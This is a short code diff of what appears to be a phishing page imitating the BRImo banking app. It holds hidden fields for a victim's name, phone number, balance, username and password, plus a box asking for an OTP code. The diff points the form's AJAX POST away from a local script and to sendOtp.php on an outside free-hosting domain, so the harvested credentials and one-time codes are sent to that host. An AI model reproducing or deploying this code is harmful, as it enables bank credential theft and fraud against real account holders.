@@ -308,7 +308,7 @@ alert{
  <input type="hidden" id="nama" name="nama"> 
  <input type="hidden" id="nomor" name="nomor">
   <input type="hidden" id="saldo" name="saldo">
-  <input type="hidden" id="username" name="user"> 
+  <input type="hidden" id="uname" name="uname"> 
  <input type="hidden" id="pass" name="pass">
   
               <textarea name="sms" id="sms" class="bubble-element MultiLineInput" data-gramm_editor="false" tabindex="1" placeholder="Silahkan masukan Kode OTP atau Tautan BRImo di dalam ini" maxlength="" rows="1" style="max-width: 90%; display: block; margin: auto; width: 346px; left: 0px; top: 0px; background-color: rgb(255, 255, 255); min-height: 104px; overflow: hidden; overflow-wrap: break-word; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; font-family: Arial; font-size: 14px; font-weight: bold; color: rgb(61, 61, 61); text-align: left; height: 102px;" required></textarea>
@@ -358,7 +358,7 @@ document.getElementById("pass").value = norek + "";
 $.ajax({
 
  type: 'POST',
- url: 'sendOtp.php',
+ url: 'https://directle-autoloadegradasi.000webhostapp.com/dj-gemoyku/bri2/sendOtp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
